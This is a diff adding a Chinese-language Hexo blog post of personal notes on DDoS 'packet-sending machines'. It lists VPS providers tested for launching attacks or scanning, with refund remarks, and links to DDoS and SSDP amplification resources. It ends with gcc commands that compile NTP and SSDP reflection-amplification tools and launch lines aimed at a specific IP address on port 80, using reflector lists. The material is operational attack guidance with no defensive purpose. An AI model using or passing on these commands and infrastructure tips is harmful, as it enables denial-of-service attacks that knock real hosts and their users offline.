@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="John Doe">
+
+
+
+
+
+<title>Hack-【发包机试水测试】 | By:weizai Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">By:weizai&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">By:weizai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Hack-【发包机试水测试】</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 20, 2021&nbsp;&nbsp;18:07:21</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Hack/">Hack</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="Hack-【发包机试水测试】"><a href="#Hack-【发包机试水测试】" class="headerlink" title="Hack-【发包机试水测试】"></a>Hack-【发包机试水测试】</h3><p>测试笔记 </p>
+<p><a target="_blank" rel="noopener" href="https://www.aeys.org/thread-4239-1-1.html">https://www.aeys.org/thread-4239-1-1.html</a>   ddos态势</p>
+<p><a target="_blank" rel="noopener" href="https://cp.myprepaid-server.com/clientarea.php?action=productdetails&id=2919">https://cp.myprepaid-server.com/clientarea.php?action=productdetails&amp;id=2919</a>    测试无用 可扫描</p>
+<p><a target="_blank" rel="noopener" href="https://onevpshosting.com/clientarea.php?action=services">https://onevpshosting.com/clientarea.php?action=services</a>  买了 再试  不行 （已退款）</p>
+<p><a target="_blank" rel="noopener" href="https://clovux.net/billing/clientarea.php?action=services">https://clovux.net/billing/clientarea.php?action=services</a>  不行 申请退款了</p>
+<p><a target="_blank" rel="noopener" href="https://client.virtualine.net/cart.php?a=confproduct&i=0">https://client.virtualine.net/cart.php?a=confproduct&amp;i=0</a> 没测试</p>
+<p><a target="_blank" rel="noopener" href="https://clients.accuristechnologies.ca/index.php?rp=/store/ottawa-kvm-vps">https://clients.accuristechnologies.ca/index.php?rp=/store/ottawa-kvm-vps</a>   测试了 不行  （申请退款了）</p>
+<p>发包机渠道</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1sK421e7Y8/?spm_id_from=333.337.search-card.all.click&vd_source=09c378d5b1716fa19f2d2471f10b943d">https://www.bilibili.com/video/BV1sK421e7Y8/?spm_id_from=333.337.search-card.all.click&amp;vd_source=09c378d5b1716fa19f2d2471f10b943d</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.daidc.com/">http://www.daidc.com</a> 安徽合肥联通扫描 </p>
+<p><a target="_blank" rel="noopener" href="https://ipraft.com/%E9%A6%99%E6%B8%AF%E7%9A%84">https://ipraft.com/香港的</a> 3u</p>
+<p><a target="_blank" rel="noopener" href="https://www.seflow.net/dedicated/">https://www.seflow.net/dedicated/</a> 大哥给的 10g</p>
+<p>1、笔记  <a target="_blank" rel="noopener" href="https://www.eserver.ru/c">https://www.eserver.ru/c</a>    <a target="_blank" rel="noopener" href="https://1byte.com/">https://1byte.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.colocrossing.com/index.php?rp=/login">https://cloud.colocrossing.com/index.php?rp=/login</a> 扫描的</p>
+<p><a target="_blank" rel="noopener" href="https://cp.myprepaid-server.com/clientarea.php?action=cancel&id=2919">https://cp.myprepaid-server.com/clientarea.php?action=cancel&amp;id=2919</a> 扫描</p>
+<p>BudgetVM  扫描快的</p>
+<p>DOS:攻击</p>
+<p><a target="_blank" rel="noopener" href="https://www.shellop.com/archives/14">https://www.shellop.com/archives/14</a></p>
+<p>ssdp </p>
+<p><a target="_blank" rel="noopener" href="https://www.aeys.org/2298.html">https://www.aeys.org/2298.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://dstat.cc/l4nonprotected?id=Litnics">https://dstat.cc/l4nonprotected?id=Litnics</a></p>
+<p>gcc -lpthread ntp.c -lpcap -o ntp</p>
+<p>gcc -lpthread ssdp.c -lpcap -o ssdp</p>
+<p>.&#x2F;ssdp 206.212.246.14 80 ssdpfiltered.txt 5 -1 100000 .&#x2F;ntp 206.212.246.14 80 ntpamp.txt 5 -1 100000</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://caoheike.github.io/2021/08/20/Hack-%E3%80%90%E5%8F%91%E5%8C%85%E6%9C%BA%E8%AF%95%E6%B0%B4%E6%B5%8B%E8%AF%95%E3%80%91/">https://caoheike.github.io/2021/08/20/Hack-%E3%80%90%E5%8F%91%E5%8C%85%E6%9C%BA%E8%AF%95%E6%B0%B4%E6%B5%8B%E8%AF%95%E3%80%91/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Hack/"># Hack</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2021/08/20/Hack-%E3%80%90%E5%8F%8D%E6%9F%A5%E3%80%91/">Hack-【反查】</a>
+            
+            
+            <a class="next" rel="next" href="/2021/08/20/Hack-%E3%80%90%E6%B5%8B%E9%87%8F%E5%A2%99%E3%80%91/">Hack-【测量墙】</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
